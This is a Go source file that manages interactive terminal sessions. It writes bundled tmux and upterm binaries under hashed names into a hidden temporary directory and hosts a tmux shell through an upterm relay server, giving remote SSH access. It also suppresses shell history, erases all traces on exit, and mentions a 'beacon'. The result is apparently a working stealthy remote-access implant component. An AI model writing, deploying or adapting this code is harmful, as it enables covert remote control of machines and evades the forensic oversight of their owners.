// Package session manages tmux+upterm interactive terminal sessions.
// All binaries are extracted to an ephemeral temp dir and deleted on session end.
// Zero persistent footprint outside the client binary itself.
package session

import (
	"bufio"
	"context"
	"fmt"
	"io"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

// Session represents a running tmux+upterm terminal session.
type Session struct {
	ID         string
	ServerID   string
	TmuxName   string // opaque: s-<first8>
	ExtractDir string // ephemeral dir containing extracted binaries
	TmuxBin    string
	UptermBin  string
	UptermPID  int
	SSHLink    string

	mu sync.Mutex
}

// Manager holds all active sessions and the shared temp root dir.
type Manager struct {
	mu       sync.Mutex
	sessions map[string]*Session
	TempRoot string // /tmp/.<hex>/ — shared ephemeral root, cleaned on process exit
}

// NewManager creates a session manager with the given ephemeral root.
func NewManager(tempRoot string) *Manager {
	return &Manager{
		sessions: make(map[string]*Session),
		TempRoot: tempRoot,
	}
}

// Create starts a new terminal session:
// 1. Extracts tmux+upterm to an ephemeral subdir
// 2. Launches upterm hosting a renamed tmux session
// 3. Parses the SSH connection string
// Returns the SSH link or an error.
func (m *Manager) Create(
	ctx context.Context,
	actionID string,
	serverID string,
	authorizedKeys string,
	uptermRelay string,
	tmuxData []byte,
	uptermData []byte,
) (*Session, error) {
	sessID := actionID
	tmuxName := "s-" + sessID[:8]

	// Create ephemeral dir for this session's binaries
	extractDir := filepath.Join(m.TempRoot, deriveOpaqueName(sessID, "t"), "s")
	if err := os.MkdirAll(extractDir, 0o700); err != nil {
		return nil, fmt.Errorf("session: mkdir: %w", err)
	}

	// Extract binaries with opaque names
	tmuxBin := filepath.Join(extractDir, deriveOpaqueName(sessID, "tm"))
	uptermBin := filepath.Join(extractDir, deriveOpaqueName(sessID, "up"))
	authKeysPath := filepath.Join(extractDir, "ak")

	if err := extractBinary(tmuxData, tmuxBin); err != nil {
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: extract tmux: %w", err)
	}
	if err := extractBinary(uptermData, uptermBin); err != nil {
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: extract upterm: %w", err)
	}
	if err := os.WriteFile(authKeysPath, []byte(authorizedKeys+"\n"), 0o600); err != nil {
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: write authorized_keys: %w", err)
	}

	// Start upterm hosting a tmux session
	//nolint:gosec // paths derived from internal state, not user input
	cmd := exec.CommandContext(ctx,
		uptermBin,
		"host",
		"--accept",
		"--allow-local-tcp-forwarding",
		"--authorized-keys", authKeysPath,
		"--server", uptermRelay,
		"--",
		tmuxBin, "new-session", "-s", tmuxName,
	)
	// Zero history fingerprint
	cmd.Env = sanitizeEnv(os.Environ())

	stdoutPipe, err := cmd.StdoutPipe()
	if err != nil {
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: stdout pipe: %w", err)
	}

	if err := cmd.Start(); err != nil {
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: start upterm: %w", err)
	}

	// Parse SSH connection string from upterm's stdout
	sshLink, err := parseSSHLink(stdoutPipe, 30*time.Second)
	if err != nil {
		_ = cmd.Process.Kill()
		_ = os.RemoveAll(extractDir)
		return nil, fmt.Errorf("session: parse SSH link: %w", err)
	}

	sess := &Session{
		ID:         sessID,
		ServerID:   serverID,
		TmuxName:   tmuxName,
		ExtractDir: extractDir,
		TmuxBin:    tmuxBin,
		UptermBin:  uptermBin,
		UptermPID:  cmd.Process.Pid,
		SSHLink:    sshLink,
	}

	m.mu.Lock()
	m.sessions[sessID] = sess
	m.mu.Unlock()

	return sess, nil
}

// Kill terminates a session and removes all extracted files.
// Safe to call even if the session is already gone.
func (m *Manager) Kill(sessionID string) error {
	m.mu.Lock()
	sess, ok := m.sessions[sessionID]
	if ok {
		delete(m.sessions, sessionID)
	}
	m.mu.Unlock()

	if !ok {
		return nil // already gone
	}

	return sess.cleanup()
}

// KillAll terminates every active session. Called on clean shutdown.
func (m *Manager) KillAll() {
	m.mu.Lock()
	all := make([]*Session, 0, len(m.sessions))
	for _, s := range m.sessions {
		all = append(all, s)
	}
	m.sessions = make(map[string]*Session)
	m.mu.Unlock()

	for _, s := range all {
		_ = s.cleanup()
	}
}

func (s *Session) cleanup() error {
	s.mu.Lock()
	defer s.mu.Unlock()

	// Kill upterm process
	if s.UptermPID > 0 {
		if p, err := os.FindProcess(s.UptermPID); err == nil {
			_ = p.Kill()
		}
	}

	// Kill tmux session (best-effort)
	if s.TmuxBin != "" && s.TmuxName != "" {
		_ = exec.Command(s.TmuxBin, "kill-session", "-t", s.TmuxName).Run()
	}

	// Remove all extracted files
	if s.ExtractDir != "" {
		_ = os.RemoveAll(s.ExtractDir)
	}

	return nil
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

func extractBinary(data []byte, dest string) error {
	if err := os.WriteFile(dest, data, 0o700); err != nil {
		return err
	}
	return nil
}

// parseSSHLink reads upterm's stdout looking for an SSH connection string.
// Upterm prints something like: "ssh ... user@host -p <port>"
func parseSSHLink(r io.Reader, timeout time.Duration) (string, error) {
	done := make(chan string, 1)
	errc := make(chan error, 1)

	go func() {
		scanner := bufio.NewScanner(r)
		for scanner.Scan() {
			line := scanner.Text()
			if strings.HasPrefix(line, "ssh ") || strings.Contains(line, "@") {
				done <- strings.TrimSpace(line)
				return
			}
		}
		errc <- fmt.Errorf("upterm exited without printing SSH link")
	}()

	select {
	case link := <-done:
		return link, nil
	case err := <-errc:
		return "", err
	case <-time.After(timeout):
		return "", fmt.Errorf("timeout waiting for SSH link from upterm")
	}
}

// sanitizeEnv returns a cleaned environment with history vars unset.
func sanitizeEnv(env []string) []string {
	blocked := map[string]bool{
		"HISTFILE":        true,
		"HISTSIZE":        true,
		"HISTFILESIZE":    true,
		"HISTCONTROL":     true,
		"HISTIGNORE":      true,
		"HISTTIMEFORMAT":  true,
		"BASH_HISTORY":    true,
	}
	var clean []string
	for _, e := range env {
		key := strings.SplitN(e, "=", 2)[0]
		if !blocked[key] {
			clean = append(clean, e)
		}
	}
	clean = append(clean, "HISTFILE=/dev/null")
	return clean
}

// deriveOpaqueName produces an opaque 8-char name derived from the session ID and a suffix.
func deriveOpaqueName(id, suffix string) string {
	combined := id + suffix
	// Simple deterministic hex from first bytes
	var h uint64
	for _, c := range combined {
		h = h*31 + uint64(c)
	}
	return fmt.Sprintf("%08x", h)
}

// CrashRecovery scans for any leftover tmux sessions from a prior crashed client
// and kills them. Called once at startup before the first beacon.
func CrashRecovery(tempRoot string) {
	// Remove any leftover temp dirs
	entries, err := filepath.Glob(filepath.Join(tempRoot, "*"))
	if err == nil {
		for _, e := range entries {
			_ = os.RemoveAll(e)
		}
	}

	// Kill any orphaned tmux sessions with our naming prefix
	out, err := exec.Command("tmux", "ls", "-F", "#{session_name}").Output()
	if err != nil {
		return
	}
	for _, name := range strings.Split(string(out), "\n") {
		name = strings.TrimSpace(name)
		if strings.HasPrefix(name, "s-") {
			_ = exec.Command("tmux", "kill-session", "-t", name).Run()
		}
	}
}

// RandomHex generates n random hex chars for the temp root name.
func RandomHex(n int) string {
	const chars = "0123456789abcdef"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}
